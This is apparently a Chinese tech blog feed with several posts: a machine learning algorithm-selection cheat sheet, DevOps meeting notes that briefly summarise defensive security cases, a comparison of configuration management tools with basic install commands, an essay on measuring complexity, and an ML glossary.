    <url>%2F2018%2F04%2F02%2FMachine-Learning-Algorithms-Sheet%2F</url>
    <content type="text"><![CDATA[摘要 识别和应用机器学习算法解决问题 机器学习算法备忘单 何时使用特定算法? 线性回归 vs 逻辑回归,Linear SVM vs kernel SVM,Trees 神经网络和深度学习：k-means/k-modes,GMM,Hierarchical clustering,PCA,SVD,LDA Machine Learning Algorithms Overview关于目前最流行的一些机器学习算法，建议阅读： Machine Learning:机器学习算法 Machine Learning:机器学习书单 如果您已经非常熟悉这些算法，可以跳过本节。 Which machine learning algorithm should I use? Which machine learning algorithm should I use? | Hui Li | Principal Staff Scientist, Data Science 面对各种机器学习算法时，经常遇到的一个典型问题是“我应该使用哪种算法？” 问题的答案取决于许多因素，其中包括： 数据的大小，质量和性质 可用的计算时间 任务的紧迫性 你想对数据做什么 即使是一位经验丰富的数据科学家，也无法在尝试不同的算法之前知道哪种算法会表现最好。我们并不主张这是唯一的、完美的方案，而是希望能够根据一些明确的因素提供指导——首先应该尝试哪些算法。 机器学习算法备忘单机器学习算法备忘单（The machine learning algorithm cheat sheet）可以帮助您从各种机器学习算法中进行选择，以找到适合您的特定问题的适当算法。本文将说明使用备忘单的过程。 由于备忘单是为初学者数据科学家和分析师设计的，因此在讨论算法时会做一些简化假设。这里推荐的算法来自几位数据科学家和机器学习专家和开发人员的反馈和提示。有几个问题我们的看法并不一致，对于这些问题，我们试图强调通用性、尽量调和差异。随着我们的知识库发展，将包含一套更完整的方法，其他算法将在稍后添加。 如何使用备忘单备忘单使用方法，依次阅读的路径和算法标签，例如： 如果要执行降维（dimension reduction），则使用主成分分析（principal component analysis） 如果您需要快速进行数值预测（numeric prediction），请使用决策树（decision tree）或逻辑回归（ logistic regression） 如果您需要分层结果，则使用分层聚类（hierarchical clustering） 有些场景可能会适用不止一个分支，也有些场景不能完美匹配上，重要的是要记住，这些路径只是基于经验的方法，因此一些建议并不完全准确。许多数据科学家的关电视，找到最好算法的唯一方法就是尝试所有算法（the only sure way to find the very best algorithm is to try all of them）。 何时使用特定算法?线性回归 vs 逻辑回归线性回归是一种讨论连续因变量之间关系的建模方法。如果因变量不是连续的而是分类的，则可以使用 logit link function 将线性回归转化为逻辑回归。逻辑回归是一种简单，快速而强大的分类算法。这里我们讨论二进制情况下的因变量 在逻辑回归中，我们使用不同的假设类来尝试预测给定示例属于“1”类的概率与其属于“-1”类的概率。 线性回归 逻辑回归 Linear SVM vs kernel SVM当数据的各种类型不是线性可分的时候，核方法（Kernel method 或 Kernel tricks）可以用来将非线性可分的空间映射到更高维的线性可分的空间。 支持向量机（SVM）算法相当于通过法线（Normal vector）和超平面偏差（bias of the hyperplane）获得分类器。这个超平面（边界）尽可能宽地分隔不同的类，该问题可以转化为约束优化问题。 当大多数因变量是数字时，逻辑回归和 SVM 是首先应该尝试的分类方法。这些模型易于实现，参数易调整，性能也相当不错。非常适合初学者。 线性回归 逻辑回归 树 | Tree 预测模型中的决策树 决策树（Decision Tree），随机森林（Random Forest）和梯度提升（Gradient Boosting ）都是基于决策树的算法。决策树有许多变体，但它们都做同样的事情 - 将特征空间细分成大多数标签相同的区域。决策树很容易理解和实施。但是，当我们耗尽树枝（branch）并且深入时，它们倾向于过度拟合数据。随机森林和梯度提升是两种使用树算法的实现，具有良好的精确度，是克服过拟合问题（over-fitting problem）的流行方法。 注：在统计学中，过拟合（overfitting，或称过度拟合）现象是指在拟合一个统计模型时，使用过多参数。对比于可获取的数据总量来说，一个荒谬的模型只要足够复杂，是可以完美地适应数据。过拟合一般可以视为违反奥卡姆剃刀原则。当可选择的参数的自由度超过数据所包含信息内容时，这会导致最后（拟合后）模型使用任意的参数，这会减少或破坏模型一般化的能力（目标效果应适用于一般化的情况而非只是训练时所使用的现有数据（根据它的归纳偏向））。另一种常见的现象是使用太少参数，以致于不适应数据，这则称为乏适（underfitting，或称：拟合不足）现象。 神经网络和深度学习 神经网络在 20 世纪 80 年代中期由于其并行和分布式处理能力而兴旺发达。但是在这个领域的研究受反向传播算法无效性的阻碍，它广泛用于优化神经网络参数。支持向量机（SVM）和其他更简单的模型，可以通过求解凸优化问题来轻松训练，逐渐取代机器学习中的神经网络。 近年来，诸如无监督预训练（ unsupervised pre-training）和分层贪婪训练（layer-wise greedy training）等新的和改进的训练技术促进了神经网络的复兴。日益强大的计算能力，例如图形处理单元（GPU）和大规模并行处理（MPP），也刺激了神经网络的发展，已经发明出具有数千层的神经网络模型。 注：反向传播（Backpropagation，缩写 BP）是“误差反向传播”的简称，一种与最优化方法（如梯度下降法）结合使用的，用来训练人工神经网络的常见方法。该方法对网络中所有权重计算损失函数的梯度。这个梯度会反馈给最优化方法，用来更新权值以最小化损失函数。 SAS Visual Analytics 中的神经网络换句话说，浅层神经网络已演变成深度学习神经网络。深度神经网络对于监督学习非常成功。当用于语音和图像识别时，深度学习的表现与人类一样好，甚至更好。应用于无监督学习任务（如特征提取），深度学习还可从原始图像或语音中提取特征，而人工干预则更少。 神经网络由三部分组成：输入层（input layer），隐藏层（hidden layers）和输出层（output layer）。训练样本定义了输入层和输出层。当输出层是一个分类变量时，神经网络就是解决分类问题的一种方法。当输出层是连续变量时，网络可以用来做回归。当输出层与输入层相同时，网络可用于提取内在特征。隐藏层的数量决定了模型的复杂性和建模容量。 k-means / k-modes，GMM（高斯混合模型）聚类k-means / k-modes，GMM 聚类旨在将 n 个观测分为 k 个聚类。 简单地说，k-means 的结果是每个数据点被 assign 到其中某一个 cluster 了，即 hard assignment，而 GMM 则给出这些数据点被 assign 到每个cluster 的概率，又称作 soft assignment 。每个样本都有与每个群集关联的概率。当给定聚类数 k 时，两种算法都足够简单快速地进行聚类。 k-means GMM DBSCAN | 基于密度的空间聚类DBSCAN ，Density-based spatial clustering of applications with noise ，是在 1996 年由 Martin Ester 等提出的聚类分析算法， 这个算法是以密度为本的：给定某空间里的一个点集合，该算法能把附近的点分成一组（有很多相邻点的点），并标记出位于低密度区域的局外点（最接近它的点也十分远），DBSCAN 是一个最常用的聚类分析算法。 Hierarchical clustering | 分层聚类分层分区可以使用树结构（树状图）可视化。它不需要集群的数量作为输入，并且可以使用不同的 K 来在不同粒度级别处查看分区（即精炼/粗化集群 refine/coarsen clusters）。 PCA，SVD和LDA我们通常不希望直接将大量特征提供给机器学习算法，因为某些特征可能无关紧要，或者“内在”维度可能小于特征的数量。主成分分析（PCA，Principal components analysis），奇异值分解（SVD，Singular value decomposition）和隐含狄利克雷分布（LDA，latent Dirichlet allocation）均可用于降维。 PCA 是一种无监督聚类方法，它将原始数据空间映射到较低维空间，同时保留尽可能多的信息。 PCA 基本上找到最能保留数据方差的子空间，子空间由数据协方差矩阵的主要特征向量定义。 SVD 和 PCA 有一定联系——中心数据矩阵的 SVD（特征 vs. 样本）能提供定义由 PCA 所找到的同样子空间的主左奇异向量（dominant left singular vectors）。然而，SVD 是一种更通用的技术，因为它也可以做 PCA 不能做的事情。例如，用户与电影矩阵的 SVD 能够提取可以在推荐系统中使用的用户资料和电影资料。另外，在自然语言处理（NLP）中，SVD 还被广泛用作主题建模工具，称为潜在语义分析（ latent semantic analysis ）。 NLP 中的相关技术是隐含狄利克雷分布（ LDA ）。 LDA 是概率性主题模型，它以与高斯混合模型（GMM）相似的方式，即将连续数据按照高斯密度分解——将文档分解为主题。与 GMM 不同的是，LDA 对离散数据（文档中的词）进行建模，并且它约束了主题需是根据狄利克雷分布的先验分布。 总结：选择算法时的注意事项选择算法时请始终考虑以下方面：准确性（accuracy），训练时间（training time）和易用性（ease of use）。许多用户将准确性放在首位，而 初学者倾向于关注他们最熟悉的算法（Beginners tend to focus on algorithms they know best）。 首先要考虑的是如何获得结果，无论结果如何。初学者倾向于选择易于实现并能够快速获得结果的算法（Beginners tend to choose algorithms that are easy to implement and can obtain results quickly）。这个工作无可厚非，只需确保它只是整个过程的第一步。一旦您获得了一些结果并熟悉数据，您可能需要花更多时间、使用更复杂的算法来加强对数据的理解，从而进一步改进结果。 最好的算法也许不是那些已经获得最高准确率的方法，因为算法通常需要仔细调整、广泛训练才可以实现可用性方面的最佳性能。 扩展阅读《The Machine Learning Master》 Machine Learning(一):基于 TensorFlow 实现宠物血统智能识别 Machine Learning(二):宠物智能识别之 Using OpenCV with Node.js Machine Learning:机器学习项目 Machine Learning:机器学习算法 Machine Learning:如何选择机器学习算法 Machine Learning:神经网络基础 Machine Learning:机器学习书单 Machine Learning:人工智能媒体报道集 Machine Learning:机器学习技术与知识产权法 Machine Learning:经济学家谈人工智能 数据可视化（三）基于 Graphviz 实现程序化绘图 参考文献 Which machine learning algorithm should I use? | Hui Li | Principal Staff Scientist, Data Science An Information-Theoretic Analysis of Hard and Soft Assignment Methods for Clustering Greedy Layer-Wise Training of Deep Networks Understanding and interpreting your data set 1 KERNEL METHODS IN MACHINE LEARNING1 |By Thomas Hofmann, Bernhard Scholkopf and Alexander J. Smola]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>架构师</tag>
        <tag>Machine-Learning</tag>
        <tag>数学与算法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DevOps 漫谈：DevOps实践的本质是文化]]></title>
    <url>%2F2018%2F03%2F29%2FDevOps-Culture%2F</url>
    <content type="text"><![CDATA[摘要 DevOps实践的本质是文化 DevOps实践的本质是文化2016-07-24 运维日 广州活动纪要地点：羊城晚报 同创汇 刘宇职业路径：新浪－&gt;Puppet实践－&gt;Puppet系列文集－&gt;InfoQ编辑－&gt;西山居社区：LinuxTone.org、InfoQ Automation：工具化 Lean 精益： Measurement：度量一切 Sharing：不管是否成功 人物：Patrick Debois：比利时，独立顾问，DevOps领袖（2008年） 推荐书单 《The Phoenix Project》 《The DevOps Cookbook》 企业：Facebook Don’t make me think 凡是被很多人不断重复的好习惯，要将其自动化整合到工具 实践经验1.站立会2.Kanban|看板3.复盘：总结－发现问题－改进4.带领团队翻译书籍 （这事听着都打鸡血) 学习力－团队生命之根 魅族云1.异地多活：专线打通多个IDC机房2.KVM3.网络：OpenStack 实现控制器、GSLB 全局负载均衡，智能路由 微信：自动压力测试实践张兴：8年＋ 1.生产环境运行压力测试2.接入Proxy层，调整请求分配权重3.压测管控 失败监控（系统、逻辑）耗时监控（SUR client）快速拒绝（如何判断是否可以丢弃？）硬件限制（CPU，内存，网卡） 数据：15s监控数据入库画图，1min回退配置（1w台服务器），降低放量速率 YY安全 案例一：海量小包攻击性防御1.20140828 脉冲DDoS攻击40小时，40人团队，监控不足5秒钟一次，发送小包 黑产报价：150元可购买 15G流量，700W pps，攻击成本低 案例二：合作方服务器被入侵概率高（木马） ps/netstat污染处理：内核态，查看System.Call (可以挖掘写一篇) 案例三：主播IP泄漏业务逻辑bug，异常抛出IP 案例四确定当前主要矛盾：投诉盗号、盗刷？服务器入侵？DDoS ?利用现有资源（自有编制、第三方合作），最大投入产出比 决策变量技术预研、业务规模、发展阶段、主要矛盾（切入点） 扩展阅读DevOps 漫谈系列 《凤凰项目》：从作坊到工厂的寓言故事 Kanban 看板管理实践 DevOps 漫谈：基础设施部署和配置管理 Linux 容器安全的十重境界 工程师的自我修养：全英文技术学习实践 DevOps 实践的本质是文化 学习力－团队生命之根 带领团队翻译书籍 Don’t make me think 凡是被很多人不断重复的好习惯，要将其自动化整合到工具 参考文献 中小企业监控体系构建实战 LinkedIn:如何利用大数据算法定位网站性能瓶颈(BOSS) 树莓派(raspberrypi)、saltstack 在线下自助机运维上的应用 | Jasey Wang 邱俊涛：为故障和失败做设计 酷壳：AWS 的 S3 故障回顾和思考 酷壳：从GITLAB误删除数据库想到的 酷壳：这多年来我一直在钻研的技术 GitHub运维机器人 运维的本质：可视化 |2015-05-14 王津银 InfoQ]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>DevOps</tag>
        <tag>Engineering</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DevOps 漫谈：基础设施部署和配置管理]]></title>
    <url>%2F2018%2F03%2F26%2FDevOps-Deployment%2F</url>
    <content type="text"><![CDATA[摘要 Ansible vs. Chef vs. Fabric vs. Puppet vs. SaltStack 在生产环境中工作，常常意味着连续部署和遍布全球的基础设施。如果您的基础架构是分散式和基于云的，同时您需要在大量服务器上频繁部署大量类似的服务，如果此时有一种方法可以自动配置和维护以上所有内容将是您的一大福音。 部署管理工具（Deployment management tools）和配置管理工具(configuration management tools)是为此目的而设计的。它们使您能够使用“食谱”（recipes），“剧本” (playbooks)，模板(templates)或任何术语来简化整个环境中的自动化和编排，以提供标准、一致的部署。 在选择工具时请记住几点注意事项。首先是了解工具的模型。有些工具采用主控模式（master-client model），它有一个集中控制点（master）与分布式部署的服务器进行通信，其他部分则可以在更本地的层面上运行。另一个考虑因素是你的环境构成。有些工具是采用不同的语言编写的，对于特定的操作系统或设置可能会有所不同。确保您选择的工具与您的环境完美配合，充分利用团队的特定技能可以为您节省很多麻烦。 项目 开发语言 部署模型 适用场景 注意事项 付费 结论 Ansible Python push model,agentless ssh-based nodes&lt;1000 Linux [ ok ] Mac [hard] Windows [hard] —– —– SaltStack Python master-client,zeromq ssh &amp; push 高性能 Linux [ ok ] Mac [only salt-minion] Windows [ ok ] 学习曲线陡峭 —– —– Chef Ruby master-client git-based development-focused —– —– —– Puppet Ruby master-client,model-driven —– —– —– —– Fabric Python —– ssh-based —– —– —– 1. Ansible￼Ansible是一种开源工具，用于以可重复的方式将应用程序部署到远程节点和配置服务器。它为您提供了基于推送模型（push model ）推送多层应用程序和应用程序组件的通用框架，您也可以根据需要将其设置为 master-client 模式。 Ansible 建立在可用于各种系统上部署应用程序的剧本(playbook)。 何时使用它 ：对您来说最重要的是快速，轻松地启动和运行，并且您不想在远程节点或受管服务器上安装代理（Agent）。如果您的需求重点更多地放在系统管理员身上，专注于精简和快速，请考虑 Ansible 。 价格：免费的开源版本，Ansible Tower 的付费套餐每年 5000 美元（最多可容纳100个节点）。 赞成的理由： 基于 SSH , 不需要在远程节点安装任何代理 学习曲线平缓、使用 YAML Playbook 结构简单，结构清晰 具有变量注册功能，可以使前一个任务作为后一个任务的变量 代码库精简 反对的理由： 相较其他编程语言的工具功能有限。 通过 DSL 实现其逻辑，这意味着需要经常查看文档直到您学会为止 即使是最基本功能也需要变量注册，这可能使简单任务变得复杂 内省（Introspection）很差。例如很难在剧本中看到变量的值 输入，输出和配置文件格式之间缺乏一致性 性能存在一定瓶颈 Ansible Guide: Create Ansible Playbook for LEMP Stack 2. Chef￼Chef 是一个配置管理开源工具，用户群专注面向开发者。Chef 作为 master-client 模式运行，需要一个单独的工作站来控制 master 。Chef 基于 Ruby 开发，纯 Ruby 可以支持大多数元素。Chef 的设计是透明的，并遵循给定的指示，这意味着你必须确保你的指示是清楚的。 何时使用它：在考虑 Chef 之前，需要确保你熟悉 Git ，因为它需要配置 Git ，你必须编写 Ruby 代码。Chef 适合以开发为中心（development-focused ）的团队和环境。对于寻求更成熟异构环境解决方案的企业来说，这是一件好事。 价格：提供免费的开源版本，标准版和高级版计划以每年节点为单位定价。 Chef Automate 的价格为每个节点 137 美元，或者采用 Hosted Chef 每个节点每年节省72 美元。 赞成的理由： 丰富的模块和配置配方(recipes) 代码驱动的方法为您提供更多的配置控制和灵活性 以 Git 为中心赋予 Chef 强大的版本控制功能 ‘Knife’工具（使用 SSH 从工作站部署代理）减轻了安装负担 反对的理由： 如果您还不熟悉 Ruby 和面向过程编程，学习曲线会非常陡峭 这不是一个简单的工具，可能需要维护大量的代码库和复杂的环境 不支持推送功能 3. FabricFabric 是一个基于 Python 的应用程序部署工具。Fabric 的主要用途是在多个远程系统上运行任务，但它也可以通过插件的方式进行扩展，以提供更高级的功能。 Fabric 将配置您的操作系统，进行操作系统/服务器管理，自动化部署您的应用。￼何时使用它：如果您刚刚开始进入部署自动化领域，Fabric 是一个良好的开端。如果您的环境至少包含一点 Python，它都会有所帮助。 价格：免费 赞成的理由： 擅长部署以任何语言编写的应用程序。它不依赖于系统架构，而是依赖于操作系统和软件包管理器 相比其他工具更简单，更易于部署 与 SSH 进行了广泛的整合，以实现基于脚本的流水线 反对的理由： Fabric 是单点设置（通常是运行部署的机器） 使用 PUSH 模型，因此不如其他工具那样适合流水线部署模型 虽然它是用于在大多数语言中部署应用程序的绝佳工具，但它确实需要运行Python，所以您的环境中必须至少有一个适用于 Fabric 的 Python 环境 4. Puppet￼Puppet 长期依赖是全面配置管理领域的标准工具之一。Puppet 是一个开源工具，但是考虑到它已经存在了多长时间，它已经在一些最大和最苛刻的环境中进行了部署和验证。 Puppet 基于 Ruby 开发，但使用更接近 JSON 的领域专用语言（Domain Specific Language，DSL）。Puppet 采用master-client 模式运行，并采用模型驱动(model-driven)的方法。 Puppet 将工作设计为一系列依赖关系列表，根据您的设置，这可以使事情变得更容易或更容易混淆。 何时使用它： 如果稳定性和成熟度对您来说是最关键的因素，Puppet 是一个不错的选择。对于具有异构环境的大型企业和涉及多种技能范围的 DevOps 团队而言而言，这是一件好事。 价格：Puppet 分为免费的开源版本和付费的企业版本，商业版每年每个节点 120 美元（提供批量折扣）。 赞成的理由： 通过 Puppet Labs 建立了完善的支持社区 具有最成熟的接口，几乎可以在所有操作系统上运行 安装和初始设置简单 最完整的 Web UI 强大的报表功能 反对的理由： 对于更高级的任务，您需要使用基于 Ruby 的 CLI（这意味着您必须了解Ruby） 纯 Ruby 版本的支持正在缩减（而不是那些使用 Puppet 定制 DSL 的版本） Puppet 代码库可能会变得庞大，新人需要更多的帮助 与代码驱动方法相比，模型驱动方法意味着用户的控制更少 5. Saltstack ￼SaltStack（或 Salt）是一种基于 CLI 的工具，可以将其设置为 master-client 模型或非集中模型。 Salt 基于Python 开发，提供了 PUSH 和 SSH 两种方法与客户端通讯。 Salt 允许对客户端和配置模板进行分组，以简化对环境的控制。何时使用它： 如果可扩展性和弹性是一个大问题，则 Salt 是一个不错的选择。对系统管理员来说，Salt 提供的可用性非常重要。 价格：提供免费的开源版本，以及基于年度/节点订阅的 SaltStack Enterprise 版本。具体的价格没有在他们的网站上列出，据说每个节点每年的起步价为 150 美元。 赞成的理由： 一旦你渡过了入门阶段，就可以简单地组织和使用 DSL 功能丰富，不需要逻辑和状态 输入，输出和配置非常一致，全部所有 YAML （一个可读性高，用来表达数据序列的格式） 内省(Introspection)非常好。很容易看到 Salt 内部发生了什么 强大的社区 很高的可扩展性和灵活性 反对的理由： 对于新用户来说，非常难以配置，学习曲线陡峭 在入门级别而言，文档很难理解 Web UI 比同领域的其他工具更新、更轻量 对非 Linux 操作系统没有很好的支持 Ansible vs. Chef vs. Fabric vs. Puppet vs. SaltStack您使用的配置管理或部署自动化工具取决于您的环境需求和偏好。 Chef 和 Puppet 是一些较老的、更成熟的选项，它们适用于那些重视成熟性和稳定性而非简单性的大型企业和环境。 Ansible 和 SaltStack 是寻求快速和简约解决方案人士的理想选择，同时在不需要支持某些特殊功能或具有大量操作系统的环境中工作。Fabric 对于小型环境和那些正在寻求更低门槛和入门级解决方案的人来说是一个很好的工具。 SaltStack Arch:Client/Server develop language: Python future: REAL-TIME COMMUNICATION SaltStack ABC12345678## Install$ brew install saltstack## Role:Master$ service salt-master start$ netstat -ant | grep 450 | grep LISTENtcp4 0 0 *.4506 *.* LISTEN tcp4 0 0 *.4505 *.* LISTEN## Role:Master SaltStack Resources SaltStack Formulas Ansible Arch: SSH batch tools develop language: PythonAnsible ABC 1234567# Install$ sudo pip install ansible# 默认路径 /etc/ansible/hosts ,参数 -i 指定 hosts 文件$ ansible all -m shell -a "hostname" --ask-pass -i /yourdir/ansible_hosts# 或者通过环境变量指定$ export ANSIBLE_HOSTS=~/ansible_hosts$ echo "127.0.0.1" &gt; ~/ansible_hosts Puppet Arch: Agent/Server develop language: Ruby enterprise &amp; community edition Puppet ABCWordBookYAMLYAML 语言（发音 /ˈjæməl/ ）实质上是一种通用的数据串行化格式。基本语法规则如下: 大小写敏感 使用缩进表示层级关系 缩进时不允许使用Tab键，只允许使用空格。 缩进的空格数目不重要，只要相同层级的元素左侧对齐即可 # 表示行注释 YAML 支持的数据结构： 对象：键值对的集合，又称为映射（mapping）/ 哈希（hashes） / 字典（dictionary） 数组：一组按次序排列的值，又称为序列（sequence） / 列表（list） 纯量（scalars）：单个的、不可再分的值 YAML 语言教程 10 YAML tips for people who hate YAML DSL|Domain Specific Language,领域专用语言DSL的目标受众是非程序员，业务员或者最终用户。DSL 最大的设计原则就是简单，通过简化语言中的元素，降低使用者的负担；无论是 Regex、SQL 还是 HTML 以及 CSS，其说明文档往往只有几页，非常易于学习和掌握。但是，由此带来的问题就是，DSL 中缺乏抽象的概念，比如：模块化、变量以及方法等。 领域专用语言(DSL)迷思 谈谈 DSL 以及 DSL 的应用（以 CocoaPods 为例） 扩展阅读DevOps 漫谈系列 《凤凰项目》：从作坊到工厂的寓言故事 Kanban 看板管理实践 DevOps 漫谈：基础设施部署和配置管理 Linux 容器安全的十重境界 工程师的自我修养：全英文技术学习实践 DevOps 实践的本质是文化 学习力－团队生命之根 带领团队翻译书籍 Don’t make me think 凡是被很多人不断重复的好习惯，要将其自动化整合到工具 参考文献 Deployment Management Tools: Chef vs. Puppet vs. Ansible vs. SaltStack vs. Fabric SaltStack 与 Ansible 选择？| zhihu.com 中国SaltStack用户组|China SaltStack User Group 基于Salt管理iptables防火墙规则 Ansible ：一个配置管理和IT自动化工具 自动化运维工具 SaltStack 在云计算环境中的实践]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>DevOps</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[如何度量复杂性]]></title>
    <url>%2F2018%2F03%2F25%2FMathmetics-Complexity%2F</url>
    <content type="text"><![CDATA[摘要 复杂系统、复杂度(Complexity) 如何度量复杂度：熵、算法信息量、逻辑深度、热力学深度、计算能力、层次性 如何度量复杂度2001 年，物理学家劳埃德（Seth Lloyd）发表了一篇文章（《Measures of complexity：A non-exhaustive list. IEEE Control Systems Magazine, August 2001 》），分别从动力学、热力学、信息论等方面列出了 40 种度量复杂性的方法。提出了度量一个事物或过程的复杂性的三个维度： 描述它有多困难 ？ 产生它有多困难 ？ 其组织程度如何 ？ 用熵度量复杂性香农熵，相对于信息接收者的平均信息量或“惊奇度”。例如，假设消息由符号 A、C、G 和 T 组成。如果序列高度有序，如“A A A A A A …… A ” 则熵为零。完全随机的序列则有最大可能熵。最复杂的对象不是最有序的或最随机的，而是介于两者之间。 在英语里，信息和情报是同一个词（Information），而我们知道情报的作用就是排除不确定性。 如果没有信息，任何公式或者数字的游戏都无法排除不确定性。这个朴素的结论非常重要，但是在研究工作中经常被一些半瓶子醋的专家忽视，希望做这方面工作的读者谨记。(吴军 |《数学之美》) 用香农熵度量复杂性的问题。首先，所针对的对象或过程需要转换成某种“消息”的形式，这并不总是那么容易做到。另外，随机消息的熵最高，但是那些最复杂的对象都不是完全随机的。例如变形虫的基因长度远远超过其他动植物，具备复杂功能的人类基因也不是随机的，甚至能看到长期历史演化出来的规律。 用算法信息量度量复杂性为了改进熵度量复杂性的方法，1997 年柯尔莫哥洛夫（Andrey Kolmogorov）等人提出了算法信息量的概念。他们将事物的复杂度定义为能够产生对事物完整描述的最短计算机程序的长度。 为了计算有效复杂性，首先要给出事物规则性的最佳描述；有效复杂性定义为包含在描述中的信息量或规则集合的算法信息量。事物的结构可预测性越大，有效复杂性就越低。 对于一个事物的各种规则集，如何决定哪个是最好的呢？奥卡姆剃刀（Occam’s Razor, Ockham’s Razor），意思是简约之法则。最好的规则集是能够描述事物的最小规则集，同时还能将事物的随机成分最小化。奥卡姆剃刀在现代医学中的应用最具代表性，医生和医学哲学家提出了 症状化约原则（diagnostic parsimony）。即在诊断某个病症时，医生应该尽量寻找会导致所有症状的最简单可能性。“当你听到背后有蹄声时，应该想到马而不是斑马。” 虽然症状化约原则常常可能是正确的，然而也有争锋相对的意见：西卡姆格言（Hickam’s dictum），“病人乐意得多少种病就能得多少种病。” 从统计数据看，一个病人的多种症状往往会归于多种常见疾病，而不是仅仅一种。另外，排除统计的因素，有许多病人无法使用单一疾病来解释众多的症状，被证实患有多种疾病。实际上，医生很难根据一个症状来判断是或者不是某个疾病，而是不断地根据病人的生活环境、日常习惯、用药史等等来建立、测试和修改对于症状的假设才是更好的方法。 用逻辑深度度量复杂性为了更加接近我们对复杂性的直觉，数学家班尼特在 20 世纪 80 年代初提出了 逻辑深度（logical depth） 的概念。 用班尼特的话说，“有逻辑深度的事物从根本上必须是长时间计算或漫长动力过程的产物，否则就不可能产生。” 或是像劳埃德说的，“用最合理的方法生成某个事物时需要处理的信息量等同于这个事物的复杂性，这是一个很吸引人的想法。” 用热力学深度度量复杂性20 世纪 80 年代末，劳埃德和裴杰斯（Heinz Pagels）提出了一种复杂性度量方法：热力学深度（thermodynamic depth）。 与图灵机生成对事物的描述所需的时间步不同，热力学深度首先是确定“产生出这个事物最科学合理的确定事件序列”，然后测量“物理构造过程所需的热力源和信息源的总量”。例如，要确定人类基因组的热力学深度，得从最早出现的第一个生物的基因组开始，列出直到现代人类出现的所有遗传演化事件（随机变异、重组、基因复制等）。 问题：如何定义系统的状态粒度，在列出事件时，如何确定相关的宏观状态。 用计算能力度量复杂性一种观点认为，系统的计算能力如果等价于通用图灵机的计算能力，就是复杂系统。不过，班尼特等人则认为，具有执行通用计算的能力并不意味着系统本身就是复杂的；应当测量的是系统处理输入时的行为的复杂性。 用层次性度量复杂性如何用层次（degree of hierarchy）来刻画一个系统的复杂性：复杂系统由子系统组成，子系统下面又有子系统，不断往下。（《复杂性的结构》：The architecture of complexity. Simon 1962） 西蒙认为，复杂系统最重要的共性就是 层次性 和 不可分解性。在层次性复杂系统中，子系统内部的紧密相互作用比子系统之间要多得多。例如，细胞内部的新陈代谢网络就比细胞之间的作用要复杂得多。 总结各种度量复杂性的方法都抓住了一些方面，但都存在理论上和实践上的局限性，还远不能有效刻画实际系统的复杂性，度量方法的多样性也表明复杂系统具有许多维度，无法用单一的尺度来刻画。 扩展阅读 Machine Learning:机器学习算法 Machine Learning:经济学家谈人工智能 数据可视化（三）基于 Graphviz 实现程序化绘图 | 开源中国首页推荐·每日一博 参考文献 2001 劳埃德（Seth Lloyd）《Measures of complexity：A non-exhaustive list. IEEE Control Systems Magazine, August 2001 》 1962 Simon《复杂性的结构》：The architecture of complexity. 如何测出一句话中的信息量]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>Engineering</tag>
        <tag>数学与算法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Machine Learning:WordBook]]></title>
    <url>%2F2018%2F03%2F21%2FMachine-Learning-WordBook%2F</url>
    <content type="text"><![CDATA[摘要 Basic数学概念 泰勒级数 Taylor series 用无限项连加式——级数来表示一个函数，这些相加的项由函数在某一点的导数求得，以 1715 年发表了泰勒公式的英国数学家布鲁克·泰勒（Sir Brook Taylor）来命名。通过函数在自变量零点的导数求得的泰勒级数又叫做麦克劳林级数，以苏格兰数学家科林·麦克劳林的名字命名。 导数 Derivative 导数（Derivative）是微积分学中重要的基础概念。一个函数在某一点的导数描述了这个函数在这一点附近的变化率。导数的本质是通过极限的概念对函数进行局部的线性逼近。 偏导数 Partial Derivatives 在数学中，一个多变量的函数的偏导数是它关于其中一个变量的导数，而保持其他变量恒定（相对于全导数，在其中所有变量都允许变化） 超参数 Hyper Parameter 在机器学习中，超参数是在学习过程开始之前设置的一个参数。相比之下，其他参数的值是通过训练得到的。 不同的模型训练算法需要不同的超参数，一些简单的算法（如普通最小二乘回归）不需要。给定这些超参数，训练算法从数据中学习参数。例如，LASSO 是一种算法，将正则化超参数添加到普通最小二乘回归中，它必须在通过训练算法估计参数之前设置。在深度学习中，常见的超参数有：学习速率，迭代次数，层数，每层神经元的个数等。 激活函数 Activation Function 在 计算网络中， 一个节点的激活函数定义了该节点在给定的输入或输入的集合下的输出 Deep LearningNeural Network 神经网络（Neural Network，缩写 NN） 人工神经网络（Artificial Neural Network，缩写 ANN） 人工神经网络（Artificial neural network，缩写ANN），简称神经网络（neural network，缩写NN）或类神经网络，是一种模仿生物神经网络(动物的中枢神经系统，特别是大脑)的结构和功能的数学模型或计算模型。神经网络由大量的人工神经元联结进行计算。大多数情况下人工神经网络能在外界信息的基础上改变内部结构，是一种自适应系统。现代神经网络是一种非线性统计性数据建模工具，常用来对输入和输出间复杂的关系进行建模，或用来探索数据的模式。 Convolutional Neural Network 卷积神经网络(Convolutional Neural Network,缩写 CNN )In machine learning, a convolutional neural network (CNN, or ConvNet) is a type of feed-forward artificial neural network in which the connectivity pattern between its neurons is inspired by the organization of the animal visual cortex, whose individual neurons are arranged in such a way that they respond to overlapping regions tiling the visual field. Convolutional networks were inspired by biological processes and are variations of multilayer perceptrons designed to use minimal amounts of preprocessing. They have wide applications in image and video recognition, recommender systems and natural language processing. RNN RNN 一般指代时间递归神经网络(Recurrent Neural Network) 结构递归神经网络(Recursive Neural Network) A recurrent neural network (RNN) is a class of artificial neural network where connections between units form a directed cycle. This creates an internal state of the network which allows it to exhibit dynamic temporal behavior. Unlike feedforward neural networks, RNNs can use their internal memory to process arbitrary sequences of inputs. This makes them applicable to tasks such as unsegmented connected handwriting recognition or speech recognition. 递归神经网络（RNN）是两种人工神经网络的总称。时间递归神经网络的神经元间连接构成有向图，而结构递归神经网络利用相似的神经网络结构递归构造更为复杂的深度网络。单纯递归神经网络因为无法处理随着递归，权重指数级爆炸或消失的问题（Vanishing gradient problem），难以捕捉长期时间关联；而结合不同的LSTM可以很好解决这个问题。 GANGenerative Adversarial Network，生成对抗网络非监督式学习的一种方法，通过让两个神经网络相互博弈的方式进行学习。该方法由伊恩·古德费洛等人于2014年提出） Autoencoders 自动编码Reinforcement Learning 